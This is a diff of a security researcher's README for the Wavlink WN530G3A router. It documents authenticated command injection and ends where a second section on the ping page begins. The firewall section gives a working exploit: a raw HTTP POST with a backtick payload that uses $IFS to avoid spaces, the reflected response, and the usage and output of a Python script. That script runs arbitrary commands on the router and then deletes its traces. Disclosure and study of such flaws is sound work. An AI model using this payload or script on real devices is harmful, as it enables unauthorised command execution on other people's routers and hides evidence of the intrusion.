@@ -1,12 +1,135 @@
-# Wavlink-WN530G3A-Cmd-Injection
-This repo details the proof of concept exploit code for the Wavlink WN530G3 router
-
-# Command Injection in Wavlink WN530G3A
+# Wavlink-WN530G3A-Cmd-Injections
+This repo contains the details and two proof of concept exploits for the Wavlink WN530G3 router
+# Overview
 - Model QUANTUM D2G/WL-WN530G3A
 - You may browse all firmware for this model router from this url: https://docs.wavlink.xyz/Firmware/fm-530g3a/
 - You may obtain a copy of the firmware from this url: https://files2.wavlink.com/drivers/fw/WN530G3A_20230616_WAVLINK_M30G3_V230616.bin
-- This is an authenticated command injection vulnerability, valid credentials are required to exploit this vulnerability.
-- Exploit tested and verifed on firmware: `WN530G3A_20230616_WAVLINK_M30G3_V230616.bin` (located in this repo)
+- These are both authenticated command injection vulnerabilities, valid credentials are required to exploit these vulnerabilties.
+- Exploits tested and verifed on firmware: `WN530G3A_20230616_WAVLINK_M30G3_V230616.bin` (located in this repo)
+# Command Injection in Wavlink WN530G3A (FIREWALL PAGE)
+- Navigate to the router URL, my example device is running on `127.0.0.1`
+- Provide the valid password in order to login to the device
+- After authenticating you will be directed to `/main.shtml`
+- Select the Gear icon that states `Setup` on the bottom right of the displayed page
+- Look for the `Security Management` option and select it
+- A page will be displayed allowing you to alter the firewall security settings. This page is where the authenticated command injection vulnerability is
+- To manually verify this vulnerability ensure Burp Suite is running and you capture a request to change any of the firewall security settings
+## A Normal Request (No Injection)
+````
+POST /cgi-bin/firewall.cgi HTTP/1.1
+Host: wavlogin.link
+Content-Length: 122
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://wavlogin.link
+Referer: http://wavlogin.link/man_security.shtml?r=41798
+Accept-Encoding: gzip, deflate, br
+Cookie: session=750126802
+Connection: keep-alive
+
+firewall=websSysFirewall&remoteManagementEnabled=0&pingFrmWANFilterEnabled=0&blockPortScanEnabled=0&blockSynFloodEnabled=1
+````
+- Above is a standard request, there is no injection taking place.
+- The response from the server will look like below:
+````
+HTTP/1.1 200 OK
+Content-Length: 126
+Date: Sun, 14 Sep 2025 22:41:46 GMT
+Server: lighttpd
+
+blockSynFloodEnabled = 1
+pingFrmWANFilterEnabled = 0
+blockPortScanEnabled = 0
+remoteManagementEnabled = 1
+````
+- The router will reflect the selected options back at you
+## Command Injection
+- Note: This works for ANY of the parameters, I am simply using the first one as an example. All POST parameters are vulnerable to the same injection technique
+````
+POST /cgi-bin/firewall.cgi HTTP/1.1
+Host: wavlogin.link
+Content-Length: 161
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://wavlogin.link
+Referer: http://wavlogin.link/man_security.shtml?r=50611
+Accept-Encoding: gzip, deflate, br
+Cookie: session=250606356
+Connection: keep-alive
+
+firewall=websSysFirewall&remoteManagementEnabled=0`X=$IFS;id>>diag.txt;ls${X}/>>diag.txt`&pingFrmWANFilterEnabled=0&blockPortScanEnabled=0&blockSynFloodEnabled=1
+````
+- Note: Spaces cannot be used in the payload, so I was able to use the `IFS` variable in order to get a successful injection.
+- When you have a successful injection the server will respond with a `200` status code and the injection will be reflected back to you (see below)
+````
+HTTP/1.1 200 OK
+Content-Length: 145
+Date: Sun, 14 Sep 2025 22:58:31 GMT
+Server: lighttpd
+
+blockSynFloodEnabled = 1
+pingFrmWANFilterEnabled = 0
+blockPortScanEnabled = 0
+remoteManagementEnabled = 0`X=$IFS;id>>diag.txt;ls${X}/>>diag.txt`
+````
+## Automating this Exploit
+- In this repo there is an exploit script to take advantage of this injection.
+- See below for example usage and output of the script.
+- The script will remove the created file used to retrieve the command output
+````
+python3 firewall_cmd_inj.py -h                        main 
+usage: firewall_cmd_inj.py [-h] -u TARGET -p PASSWORD [-c COMMAND]
+
+POC for Wavlink WN530G3 authenticated command injection
+
+options:
+  -h, --help            show this help message and exit
+  -u, --url TARGET      The ip address/domain of the target router, format http(s)://127.0.0.1
+  -p, --password PASSWORD
+                        The password to the target router
+  -c, --command COMMAND
+                        Run single commands on the target device, curl the output, and then clean up the created
+                        file. Format: 'ls -la /'
+````
+- Provide the command to run, password and target.
+- Do not try to chain commands together with a ;. Enter a single command only
+````
+python3 firewall_cmd_inj.py -u http://127.0.0.1 -p adminadmin -c "ls -la /tmp"
+[+] Target is up...
+[+] Authentication successful, got session id:
+        session=1714157452; Path=/
+[+] Attempting to inject target
+[+] Attempting to retrieve command output: 
+drwxrwxrwt    7 sfroot   1000          4096 Sep 14 22:29 .
+drwxr-xr-x   18 sfroot   1000          4096 Sep 14 00:23 ..
+-rw-------    1 rootws   root        108822 Sep 14 01:35 .nfs000000000000c9eb00000004
+drwx------    2 rootws   root          4096 Sep 14 03:31 .uci
+-rw-------    1 rootws   root          1077 Sep 14 00:23 board.json
+-rw-------    1 rootws   root             2 Sep 14 21:28 curl_trigger
+-rw-------    1 rootws   root             2 Sep 14 21:28 dns_status
+drwx------    2 rootws   root          4096 Sep 14 03:31 etc
+drwx------    2 rootws   root          4096 Sep 14 00:23 extroot
+-rw-------    1 rootws   root             2 Sep 14 23:44 internetStatus
+drwx------    3 rootws   root          4096 Sep 14 00:23 log
+-rw-------    1 rootws   root            76 Sep 14 23:44 loginuser
+-rw-------    1 rootws   root           189 Sep 14 22:20 ls.out
+-rw-------    1 rootws   root          1227 Sep 14 22:29 out.txt
+-rw-------    1 rootws   root           233 Sep 14 23:26 ping_ret
+drwxr-xr-x    2 rootws   root          4096 Sep 14 03:31 run
+-rw-------    1 rootws   root             0 Sep 14 23:32 sta_arp_list_tmp
+-rw-------    1 rootws   root             2 Sep 14 23:44 sync_req
+-rw-------    1 rootws   root             0 Sep 14 03:10 sysupgrade.meta
+-rw-------    1 rootws   root             2 Sep 14 21:28 tmp_win_model
+-rw-------    1 rootws   root       7111547 Sep 14 03:10 update_image
+
+[+] Attempting to clean IOCs left from inject
+[+] Successfully cleaned ioc file with command output at: http://127.0.0.1/cgi-bin/diag.txt
+````
+# Command Injection in Wavlink WN530G3A (PING PAGE)
 ## Manual Exploitation
 - Navigate to the router URL, my example device is running on `127.0.0.1`
 - Provide the valid password in order to login to the device
